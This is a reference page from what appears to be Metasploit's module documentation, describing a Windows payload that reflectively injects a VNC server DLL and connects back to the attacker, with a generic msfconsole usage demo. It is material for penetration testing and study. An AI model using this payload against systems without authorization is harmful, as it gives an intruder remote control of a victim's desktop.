## VNC Server (Reflective Injection), Reverse Ordinal TCP Stager (No NX or Win7)

Inject a VNC Dll via a reflective loader (staged). Connect 
back to the attacker


## Module Name
payload/windows/vncinject/reverse_ord_tcp

## Authors
* sf
* spoonm


## References
* https://github.com/stephenfewer/ReflectiveDLLInjection
* https://github.com/rapid7/ReflectiveDLLInjection




## Platforms
* win

## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use payload/windows/vncinject/reverse_ord_tcp
msf payload(reverse_ord_tcp) > show targets
   ... a list of targets ...
msf payload(reverse_ord_tcp) > set TARGET <target-id>
msf payload(reverse_ord_tcp) > show options
   ... show and set options ...
msf payload(reverse_ord_tcp) > run
```
    
    